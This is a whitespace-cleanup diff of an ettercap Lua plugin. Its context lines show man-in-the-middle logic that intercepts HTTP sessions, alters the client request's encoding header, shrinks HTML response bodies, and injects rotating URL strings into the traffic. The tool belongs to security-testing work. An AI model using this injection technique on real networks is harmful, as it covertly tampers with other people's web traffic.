@@ -26,7 +26,7 @@ local shortsession = require("shortsession")
 local packet = require("packet")
 require("os")
 
--- We have to hook at the filtering point so that we are certain that all the 
+-- We have to hook at the filtering point so that we are certain that all the
 -- dissectors hae run.
 hook_point = hook_points.filter
 
@@ -39,14 +39,14 @@ function split_http(str)
 
   local header = string.sub(str, 0, header_end)
   local body = string.sub(str,header_end+1)
-  
+
   return header, body
 end
 
 function shrink_http_body(body)
   --local modified_body = string.gsub(body, '>%s*<','><')
   local body_len = string.len(body)
-  if body_len == 155 then 
+  if body_len == 155 then
     -- ettercap.log("Here's the body: %s\n", body)
   end
   -- ettercap.log("Trying to shrink body size %d\n", body_len)
@@ -90,7 +90,7 @@ http_states.injected      = 5
 
 function handle_request(session_data, packet_object)
   local tcp_session_data = session_data.tcp_session_data
-  local buf = packet.read_data(packet_object, 4) 
+  local buf = packet.read_data(packet_object, 4)
   if buf == "GET " then
     tcp_session_data.http_state = http_states.request_seen
   end
@@ -102,7 +102,7 @@ function handle_request(session_data, packet_object)
     if not (request == mod_request) then
       packet.set_data(packet_object, mod_request)
       -- ettercap.log("Tweaked accept-encoding\n")
-    else 
+    else
       -- ettercap.log("request: %s\n", request)
       -- ettercap.log("Couldn't find accept-encoding\n")
     end
@@ -143,7 +143,7 @@ function inject_body(session_data,orig_body)
   local shrunk_body_len = string.len(shrunk_body)
   -- ettercap.log("Shrunk body len %d\n", shrunk_body_len)
 
-  -- Add rotating string here 
+  -- Add rotating string here
   if not ip_session_data.count then
     ip_session_data.count = 0
     ip_session_data.time = 0
@@ -157,7 +157,7 @@ function inject_body(session_data,orig_body)
     end
     ip_session_data.time = os.time()
   end
-  local inject_string = inject_urls[ip_session_data.count] 
+  local inject_string = inject_urls[ip_session_data.count]
 
   local inject_str_len = string.len(inject_string) - 2
   local delta = orig_body_len - shrunk_body_len - inject_str_len
@@ -197,9 +197,9 @@ function handle_response(session_data, packet_object)
   end
 
   if tcp_session_data.http_state == http_states.request_seen then
-    local buf = packet.read_data(packet_object, 8) 
+    local buf = packet.read_data(packet_object, 8)
     if not buf == "HTTP/1." then
-      
+
       -- ettercap.log("not an HTTP response\n")
       return nil
     end
@@ -208,7 +208,7 @@ function handle_response(session_data, packet_object)
   end
 
 
-  local buf = packet.read_data(packet_object) 
+  local buf = packet.read_data(packet_object)
   local header = nil
   local body = nil
   if tcp_session_data.http_state <= http_states.response_is_html then
@@ -218,7 +218,7 @@ function handle_response(session_data, packet_object)
     -- Keep track of our header.
     if split_header then
       header = split_header
-      if string.find(split_header, "text/html") then 
+      if string.find(split_header, "text/html") then
         tcp_session_data.http_state = http_states.response_is_html
       end
     end
@@ -245,7 +245,7 @@ function handle_response(session_data, packet_object)
   tcp_session_data.http_state = http_states.body_seen
   if tcp_session_data.http_state == http_states.body_seen then
     -- If we didn't already grab the body, then we aren't in the first packet
-    -- for the response. That means that 
+    -- for the response. That means that
     --
     if not body then
       body = buf
@@ -270,7 +270,7 @@ function handle_response(session_data, packet_object)
 end
 
 -- Here's your action.
-action = function(packet_object) 
+action = function(packet_object)
   local tcp_session_id = tcp_session_key_func(packet_object)
   if not tcp_session_id then
     -- If we don't have tcp_session_id, then bail.
@@ -289,12 +289,12 @@ action = function(packet_object)
 
   local session_ptr = ffi.new("struct ec_session *")
   local session_ptr_ptr = ffi.new("struct ec_session *[1]", session_ptr)
-  local ret = ffi.C.session_get(session_ptr_ptr, ident_ptr_ptr[0], ident_len) 
+  local ret = ffi.C.session_get(session_ptr_ptr, ident_ptr_ptr[0], ident_len)
   if ret == -ffi.C.ENOTFOUND then
     return nil
   end
 
-  -- Find the direction of our current TCP packet. 
+  -- Find the direction of our current TCP packet.
   -- 0 == client -> server
   -- 1 == server -> client
   local dir = ffi.C.tcp_find_direction(session_ptr_ptr[0].ident, ident_ptr_ptr[0])
@@ -312,7 +312,7 @@ action = function(packet_object)
 
   if dir == 0 then
     handle_request(session_data, packet_object)
-  else 
+  else
     handle_response(session_data, packet_object)
   end
 
@@ -322,7 +322,7 @@ action = function(packet_object)
   local src_port = ffi.C.ntohs(packet_object.L4.src)
   local dst_port = ffi.C.ntohs(packet_object.L4.dst)
 
-  -- ettercap.log("tcp_session_demo: %d %s:%d -> %s:%d - state: %s\n", dir, src_ip, src_port, 
+  -- ettercap.log("tcp_session_demo: %d %s:%d -> %s:%d - state: %s\n", dir, src_ip, src_port,
 --                    dst_ip, dst_port, tostring(tcp_session_data.http_state))
 
 end
